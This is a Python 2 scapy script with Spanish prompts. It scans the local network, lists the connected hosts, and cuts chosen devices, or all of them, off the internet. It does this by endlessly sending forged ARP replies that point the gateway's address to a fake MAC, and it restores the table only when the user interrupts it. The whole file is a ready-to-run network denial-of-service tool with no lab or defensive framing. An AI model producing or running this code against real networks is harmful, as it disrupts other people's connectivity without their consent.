#!/usr/bin/env python

import time
import os
from scapy.all import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_ip_macs(ips):
  

  answers, uans = arping(ips, verbose=0)
  res = []
  for answer in answers:
    mac = answer[1].hwsrc
    ip  = answer[1].psrc
    res.append((ip, mac))
  return res

def poison(victim_ip, victim_mac, gateway_ip):
  
  packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
  
  packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)

def get_lan_ip():
  
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(("google.com", 80))
  ip = s.getsockname()
  s.close()
  return ip[0]

def printdiv():
  print '-----------------------------------------------------------------------------'


if os.geteuid() != 0:
  print "Tienes que ser root para iniciar"
  exit()


refreshing = True
gateway_mac = '12:34:56:78:9A:BC' 
while refreshing:
  
  myip = get_lan_ip()
  ip_list = myip.split('.')
  del ip_list[-1]
  ip_list.append('*')
  ip_range = '.'.join(ip_list)
  del ip_list[-1]
  ip_list.append('1')
  gateway_ip = '.'.join(ip_list)

  
  devices = get_ip_macs(ip_range)
  printdiv() 
  print '| $$$$$$$\                                       | $$| $$                  '
  print '| $$$$$$$\                                       | $$| $$                  '
  print '| $$$$$$$\ ______    _______   ______    ______  | $$| $$  ______   _______'
  print '| $$__/ $$|      \  /       \ /      \  |      \ | $$| $$ |      \ |       \ '
  print '| $$    $$ \$$$$$$\|  $$$$$$$|  $$$$$$\  \$$$$$$\| $$| $$  \$$$$$$\| $$$$$$$\ '
  print '| $$$$$$$ /      $$ \$$    \ | $$  | $$ /      $$| $$| $$ /      $$| $$  | $$'
  print '| $$     |  $$$$$$$ _\$$$$$$\| $$__/ $$|  $$$$$$$| $$| $$|  $$$$$$$| $$  | $$'
  print '| $$      \$$    $$|       $$| $$    $$ \$$    $$| $$| $$ \$$    $$| $$  | $$'
  print ' \$$       \$$$$$$$ \$$$$$$$ | $$$$$$$   \$$$$$$$ \$$ \$$  \$$$$$$$ \$$   \$$'
  print '                             | $$                                            '
  print '                             | $$                                            '
  print '                              \$$                                            '
  

  print "Ips conectadas:"
  i = 0
  for device in devices:
    print '%s)\t%s\t%s' % (i, device[0], device[1])
    
    if device[0] == gateway_ip:
      gateway_mac = device[1]
    i+=1

  printdiv()
  print 'Puerta enlace ip:  %s' % gateway_ip
  if gateway_mac != '12:34:56:78:9A:BC':
    print "Puerta enlace mac: %s" % gateway_mac
  else:
    print 'Puerta de enlace no encontrada, prueba a reinicar'
  printdiv()
  
  
  print "A quien quieres targetear?"
  print "(r - Recargar, a - Tirar todos, q - salir)"

  input_is_valid = False
  killall = False
  while not input_is_valid:
    choice = raw_input(">")
    if choice.isdigit():
     
      if int(choice) < len(devices) and int(choice) >= 0:
        refreshing = False
        input_is_valid = True
    elif choice is 'a':
      
      killall = True
      input_is_valid = True
      refreshing = False
    elif choice is 'r':
     
      input_is_valid = True
    elif choice is 'q':
     
      exit()
    
    if not input_is_valid:
      print 'Por favor introduce un valor valido'


if choice.isdigit():
  
  choice = int(choice)
  victim = devices[choice]
  print "Dejando a %s sin internet..." % victim[0]
  try:
    while True:
      poison(victim[0], victim[1], gateway_ip)
  except KeyboardInterrupt:
      restore(victim[0], victim[1], gateway_ip, gateway_mac)
      print '\nBien\'benido!'
elif killall:
 
  try:
    while True:
      for victim in devices:
        poison(victim[0], victim[1], gateway_ip)
  except KeyboardInterrupt:
    for victim in devices:
      restore(victim[0], victim[1], gateway_ip, gateway_mac)
    print '\nBien\'benido!'
    
